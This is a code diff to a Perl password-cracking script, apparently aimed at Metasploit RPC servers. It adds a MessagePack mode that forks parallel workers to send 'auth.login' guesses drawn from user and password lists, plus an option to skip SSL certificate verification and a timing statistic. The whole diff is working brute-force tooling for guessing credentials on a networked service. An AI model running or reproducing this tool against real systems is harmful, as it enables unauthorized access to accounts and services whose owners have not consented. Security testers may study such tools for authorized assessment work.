@@ -14,6 +14,8 @@ my $userfile;
 my $passfile;
 my $maxreq = 16;
 my $usessl = 0;
+my $rpc = "msgpack";
+my $uri = "/api/";
 
 my @childs;
 my $ch=0;
@@ -21,6 +23,9 @@ my $total=0;
 
 my $pid = 1;
 my $loop = 1;
+my $skipsslcheck = 0;
+
+my $starttime=time();
 
 Getopt::Long::Configure ("bundling");
 
@@ -29,12 +34,17 @@ my $result = GetOptions (
 	"p|port=i" => \$mx_port,
 	"U|users=s" => \$userfile,
 	"P|passwords=s" => \$passfile,
+	"k|skipsslcheck" => \$skipsslcheck,
 	"m|maxreq=i" => \$maxreq,
 	"t|timeout=i" => \$timeout,
+	"u|uri=s" => \$uri,
 	"v|verbose+"  => \$verbose,
 	"s|ssl"	=> \$usessl,
+	"r|rpc=s" => \$rpc,
 	"h|help" => \&help
 );
+
+$rpc = lc($rpc);
 
 unless ($userfile and $passfile) {
 	help();
@@ -49,6 +59,24 @@ print STDERR "[i] Cracking.\n";
 
 my $userglob = <USER>;
 chomp $userglob;
+
+my $mp;
+my $url; 
+my $agent;
+
+if ($rpc eq "msgpack") {
+	use Data::MessagePack;
+	use LWP;
+	use HTTP::Request;
+
+	$mp = Data::MessagePack->new();
+	$url = ($usessl ? "https" : "http") . "://" . $mx_host . ":" . $mx_port . $uri;
+	$agent = LWP::UserAgent->new (
+	ssl_opts => {
+		verify_hostname => (not $skipsslcheck),
+	}
+	);
+}
 
 $SIG{INT} = \&ctrlc;
 my %comb;
@@ -103,7 +131,11 @@ while ($loop) {
 	unless ($pid) {
 		# children
 		# print STDERR "Children\n";
-		mx_guess($comb{'user'},$comb{'pass'});
+		if ($rpc eq "msgpack") {
+			mx_msgpack_guess($comb{'user'},$comb{'pass'});
+		} else {
+			mx_guess($comb{'user'},$comb{'pass'});
+		}
 		exit(0);
 	}
 }
@@ -113,8 +145,11 @@ foreach (@childs) {
 	waitpid($_, 0)
 }
 
+my $endtime = time();
+my $difftime = $endtime - $starttime;
+
 print STDERR "\n";
-print STDERR "[i] Statistics: $total tries\n";
+print STDERR "[i] Statistics: $total tries in $difftime seconds.\n";
 print STDERR "[i] END\n";
 
 sub getcomb {
@@ -154,6 +189,33 @@ sub ctrlc {
 	$SIG{INT} = \&ctrlc;
 	print "\nCTRL+C presssed, stopping.\n";
 	$loop=0;
+}
+
+sub mx_msgpack_guess {
+	my ($user, $password) = @_;
+
+	my @rapack = ('auth.login',$user,$password);
+
+	my $req = new HTTP::Request('POST',$url);
+	print STDERR "[i] Combination $user:$password: Connecting to $url\n" if ($verbose>2);
+	$req->content_type('binary/message-pack');
+	my $mp =  Data::MessagePack->new();
+	$req->content($mp->pack(\@rapack));
+	my $res = $agent->request($req);
+
+	if ($res->code != 200) {
+		print STDERR "[i] Combination $user:$password: Expected 200 response, got ".$res->code." Maybe you want to skip SSL check? is it really MSF?\n";
+		print STDERR "[i] Combination $user:$password: Response got: ".$res->content."\n" if ($verbose>3);
+		return;
+	}
+
+	my $response = $mp->unpack($res->content);
+	if ($response->{'result'} eq 'success') {
+		print STDERR "[i] Combination $user:$password: Sucess\n" if ($verbose>1);
+		print "[o] Success! User: $user and Password: $password\n";
+	} else {
+		print STDERR "[i] Combination $user:$password: Wrong\n" if ($verbose>1);
+	}
 }
 
 sub mx_guess {
@@ -217,7 +279,9 @@ sub help
 	print "	-p <p>	Use port <p> (default: $mx_port)\n";
 	print "	-U <U>	Use user list <U>\n";
 	print "	-P <P>	Use password list <P>\n";
-	print " -s	use SSL\n";
+	print "	-s      use SSL\n";
+	print "	-k      skip SSL certificate check\n";
+	print "	-r <r>  use RPC style interface <r>: msgpack or oldrpc (default: $rpc)\n";
 	print "	-m <m>	Maximum number of parallel request (default: $maxreq)\n";
 	print "	-t <t>	use sock timeout <t>\n";
 	print "	-v	verbose (-vv will display every combination tried)\n";
